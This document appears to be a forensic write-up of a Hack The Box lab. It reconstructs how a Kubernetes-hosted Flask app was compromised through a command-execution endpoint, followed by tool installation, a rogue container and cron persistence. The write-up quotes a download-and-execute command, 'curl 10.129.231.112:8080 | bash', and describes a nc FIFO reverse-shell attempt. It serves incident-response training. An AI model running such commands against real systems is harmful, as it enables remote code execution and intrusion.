# OpTinselTrace-2 2024 Sherlock - DFIR Write-up

**Hack The Box Initial Information:**

Santa’s North Pole Operations have implemented the “Cookie Consumption Scheduler” (CCS), a crucial service running on a Kubernetes cluster. This service ensures Santa’s cookie and milk intake is balanced during his worldwide deliveries, optimizing his energy levels and health.

This part of the investigation moved away from traditional Windows artifacts and into a Kubernetes forensic collection, which was new territory for me. The Sherlock itself was fairly short, but understanding how the artifact collection was structured took a little longer than expected. Once I had a better idea of how the cluster, services, pods, and host-level artifacts fit together, the attack path became much easier to follow.

<br>

## Understanding the Kubernetes Collection

Before immediately hunting for malicious activity, I spent some time getting familiar with the collection itself.

The root of the forensic package contained several Kubernetes and host-level artifacts, including:

- Namespace directories
- `cluster-info.log`
- `nodes-info.log`
- `namespaces.log`
- `roles.yaml`
- `rolebindings.yaml`
- `secrets.yaml`
- `host-processes.log`
- `open-ports.log`
- `cron.txt`
- Pod and application logs

The namespace directories represented different logical areas of the cluster, while the YAML and log files provided information about how the environment was configured.

Since Kubernetes was not an artifact set I had worked with much before, my first goal was simply to understand:

- What applications were running
- How many pods existed
- How those pods were exposed
- What network paths existed into the application
- What host-level activity occurred after compromise

This ended up being important because the evidence for the attack was spread across both **application-level logs** and **host-level artifacts**.

<br>

## Identifying the Flask Application

Inside the `default` namespace, I found three pod directories following the same naming pattern:

`flask-app-77fbdcfcff-xxxxx`

This indicated that the Flask application was running with **three replicas**.

That made sense in a Kubernetes environment, where multiple pods can sit behind the same Service for availability and load distribution.

From there, I reviewed the service configuration to understand how the application was exposed.

The `flask-app-service` was configured as a:

`NodePort`

with:

`NodePort: 30000/TCP`

The service forwarded traffic to:

`TargetPort: 5000/TCP`

and the backend endpoints were:

`10.42.0.14:5000`

`10.42.0.16:5000`

`10.42.0.17:5000`

This lined up with the three Flask replicas I had already identified.

At a high level, the traffic flow would look something like:

**External client → Kubernetes node:30000 → Service → one of the Flask pods:5000**

Understanding this helped explain how an attacker outside of the individual pod network could still interact with the application.

<br>

## Web Application Reconnaissance

One of the pod logs immediately stood out:

`flask-app.log`

The log contained incoming HTTP requests to the Flask application, which made it behave almost like the web server, reverse proxy, or Cloudflare-style request logs I am more familiar with analyzing.

Starting around:

`2024-11-08 22:02:48`

I observed a large number of requests to different paths underneath:

`/system/`

Most of them returned:

`404 Not Found`

Examples included requests for endpoints such as:

`/system/admin`

`/system/search`

`/system/download`

`/system/files`

`/system/tools`

and many others.

The volume and variety of requests strongly suggested **content or endpoint fuzzing**.

Rather than knowing exactly which routes existed, the attacker appeared to be rapidly requesting large numbers of possible endpoints and watching the HTTP response codes for anything interesting.

A `404` meant the route did not exist.

What mattered was finding responses that behaved differently.

<br>

## Discovering the `/system/execute` Endpoint

One endpoint eventually stood out:

`/system/execute`

When the attacker initially requested it using HTTP `GET`, the server responded with:

`405 Method Not Allowed`

This was much more interesting than another `404`.

A `405` tells us that the route **does exist**, but the HTTP method being used is not allowed.

That effectively gave the attacker useful information.

Instead of continuing to guess whether `/system/execute` existed, they now knew that the application recognized the endpoint and simply expected a different request method.

This appears to have caused the attacker to shift from broad fuzzing into more targeted testing of that route.

At:

`2024-11-08 22:15:31`

the application received a:

`POST /system/execute`

That first POST returned:

`500 Internal Server Error`

The Flask traceback is particularly useful here because it reveals what the backend was doing.

The request reached:

`/app/app.py`

inside a function named:

`execute_command`

which called:

`os.system(command)`

The first request failed because `command` was `None`, causing:

`TypeError: expected str, bytes or os.PathLike object, not NoneType`

This exposed an important detail about the application: the `/system/execute` route was taking user-controlled input and passing it directly into `os.system()`.

At that point, the endpoint was effectively capable of **operating-system command execution** if the attacker supplied the expected parameter.

<br>

## Successful Remote Command Execution

Only a few seconds later, at:

`2024-11-08 22:15:36`

another:

`POST /system/execute`

returned:

`200 OK`

Immediately before the response, the application log recorded:

`uid=0(root) gid=0(root) groups=0(root)`

That output is consistent with the Linux `id` command.

This is a much stronger indicator of compromise than simply seeing an HTTP 200.

The attacker had successfully passed a command into the vulnerable `/system/execute` endpoint, the Flask application executed it through `os.system()`, and the command ran as:

`root`

At this point, the attacker had achieved **remote command execution inside the Flask container with root privileges**.

The attack path had progressed from:

**Endpoint fuzzing → route discovery → HTTP method discovery → command execution as root**

<br>

## Attempting to Establish a Shell

After gaining command execution, the attacker began trying to turn that primitive into a more usable shell.

The logs show:

`rm: cannot remove '/tmp/f': No such file or directory`

followed by:

`sh: 1: nc: not found`

The `/tmp/f` reference and attempted use of `nc` are consistent with common reverse-shell techniques that use a temporary FIFO and Netcat to redirect shell input and output.

The important part from a forensic perspective is that the attempt failed because:

`nc`

was not installed in the container.

This is common in minimal container images. Containers often contain only the packages necessary for the application to run, meaning utilities an attacker might normally expect on a full Linux host may simply not exist.

Rather than giving up, the attacker changed approach.

<br>

## Tool Installation Inside the Container

The attacker next attempted to use:

`curl`

but the log showed:

`sh: 1: curl: not found`

Again, the tool was not available inside the container.

Shortly afterward, however, the application log began showing output from:

`apt`

including:

`WARNING: apt does not have a stable CLI interface. Use with caution in scripts.`

The first attempt to install Curl failed with:

`E: Unable to locate package curl`

This suggests the container's package metadata was not current.

The attacker then appears to have updated the package repositories and retried the installation.

The log subsequently shows packages being retrieved from Debian Bookworm repositories, including:

- `libcurl4`
- `libssh2-1`
- `libldap`
- `curl`

Eventually:

`Setting up curl (7.88.1-10+deb12u7)`

appeared in the output.

This is useful evidence because it shows the attacker adapting to the environment in real time.

They did not land in a fully equipped Linux workstation. They landed in a stripped-down application container, discovered that the tools they wanted were missing, and installed the tooling required to continue the compromise.

<br>

## Payload Retrieval and Reverse Shell

Once Curl was available, I pivoted away from the application log and into:

`host-processes.log`

I searched for `curl` to see whether any running processes provided more context about how it was being used.

That search revealed:

`sh -c curl 10.129.231.112:8080 | bash`

This was one of the most important findings in the collection.

The command instructs the shell to:

1. Connect to `10.129.231.112` on port `8080`
2. Retrieve whatever content is returned
3. Pipe that content directly into `bash`

In other words:

**Download shell code from the attacker's infrastructure → immediately execute it**

Unlike downloading a script to disk first, piping directly into `bash` reduces the amount of obvious file-based evidence left behind.

This also tied directly back to what I had already observed in the Flask application logs.

The attacker first discovered the command-execution vulnerability, attempted to use existing tooling, found both `nc` and `curl` missing, installed Curl, and then used it to retrieve and execute additional attacker-controlled code.

The application logs and host process listing therefore support the same sequence from two different perspectives.

<br>

## Networking Context

One detail worth being careful about is the source IP recorded in the Flask log.

Most requests appeared to originate from:

`10.42.0.1`

It would be easy to label that as the attacker's IP, but in a Kubernetes environment that is not necessarily accurate.

The Flask pods were using addresses in the:

`10.42.0.x`

range, while the Kubernetes Service had a ClusterIP of:

`10.43.58.30`

and exposed the application externally through:

`NodePort 30000`

Because Kubernetes networking can involve forwarding, NAT, bridges, and node-level routing before traffic reaches a pod, the source IP seen by the Flask application may represent a **cluster-side gateway or node interface** rather than the original attacker.

The clearer attacker-controlled network indicator comes from the later command:

`curl 10.129.231.112:8080 | bash`

where the compromised environment actively connected outward to:

`10.129.231.112:8080`

to retrieve attacker-controlled content.

That distinction is important because internal application logs do not always preserve the true originating source IP, especially when proxies, load balancers, containers, or orchestration layers sit between the client and application.

<br>

## Suspicious Alpine Container

After identifying the initial compromise, I returned to the rest of the Kubernetes collection to determine what else had changed.

Inside the `default` namespace, I found an Alpine-based container named:

`evil`

That name obviously did not match the surrounding legitimate Flask application naming convention and immediately stood out.

Alpine Linux is a lightweight Linux distribution frequently used for containers because of its very small footprint.

The base image is only a few megabytes, which makes it quick to download and launch.

There is nothing inherently malicious about Alpine—it is extremely common in legitimate container environments—but its use here, combined with the container name `evil` and the surrounding attacker activity, strongly indicated that it had been created during the compromise.

The attacker had therefore moved beyond simply executing commands inside the original Flask application and had introduced an additional container into the environment.

<br>

## Persistence Through Cron

The final artifact I reviewed was:

`cron.txt`

Inside it, I identified:

`*/5 * * * * /opt/backdoor.sh`

This cron entry executes:

`/opt/backdoor.sh`

every five minutes.

That is a straightforward Linux persistence mechanism.

Even if the attacker's current shell or process died, the system would repeatedly execute the backdoor script at five-minute intervals, giving the attacker a way to re-establish malicious activity.

The persistence mechanism was especially notable because it occurred after the initial web application compromise.

The attacker had progressed from exploiting the vulnerable application into modifying the underlying environment to maintain longer-term access.

<br>

## Attack Timeline

Based on the available evidence, the attack can be reconstructed as:

- **Application Discovery:** The attacker identifies the externally exposed Flask service running through Kubernetes NodePort `30000`.
- **22:02 onward:** Large-scale requests against `/system/*` indicate endpoint fuzzing.
- **22:12:46:** `GET /system/execute` returns `405`, revealing that the route exists but does not accept GET.
- **22:15:31:** A targeted `POST /system/execute` reaches the vulnerable Flask handler but returns `500`.
- **22:15:36:** A second POST successfully executes a command and returns `uid=0(root)`, confirming RCE as root.
- **Post-Exploitation:** The attacker attempts to use Netcat, but `nc` is not installed.
- **Tool Staging:** The attacker attempts to use Curl and discovers that it is also missing.
- **Package Installation:** Debian package repositories are updated and Curl is installed.
- **Payload Retrieval:** `curl 10.129.231.112:8080 | bash` is executed to retrieve and execute attacker-controlled code.
- **Container Activity:** A suspicious Alpine container named `evil` appears in the environment.
- **Persistence:** A cron entry runs `/opt/backdoor.sh` every five minutes.

<br>

## Final Assessment

OpTinselTrace-2 was a much shorter investigation than the first part, but it introduced a completely different forensic environment.

Instead of relying on Windows Prefetch, Event Logs, Amcache, and RDP artifacts, this investigation required correlating Kubernetes configuration, pod logs, host processes, container activity, and Linux persistence artifacts.

The Flask application logs were especially useful because they preserved the attacker's progression almost step-by-step.

The attacker began with broad endpoint fuzzing and identified `/system/execute` after receiving a `405 Method Not Allowed` response. They then transitioned to targeted POST requests, eventually discovering that the endpoint passed user-controlled input into `os.system()`.

Successful execution of the `id` command showed that the Flask application was running attacker-supplied commands as `root`.

The attacker then attempted several methods of establishing more reliable access, discovered that Netcat and Curl were unavailable, installed Curl through the Debian package manager, and used it to retrieve and execute additional attacker-controlled code from `10.129.231.112:8080`.

Additional artifacts showed the presence of a suspicious Alpine container named `evil` and a cron-based persistence mechanism executing `/opt/backdoor.sh` every five minutes.

For me, the biggest takeaway from this part was simply getting more comfortable with **Kubernetes forensic collections**.

At first, the cluster structure made the artifact set look more complicated than it really was. Once I understood the relationship between the Service, the three Flask pod replicas, the application logs, and the host-level artifacts, the attack became much easier to reconstruct.

It was a good reminder that even when the underlying technology changes, the investigative process stays mostly the same:

**Understand the environment → establish a timeline → identify abnormal behavior → pivot into related artifacts → correlate findings before drawing conclusions.**
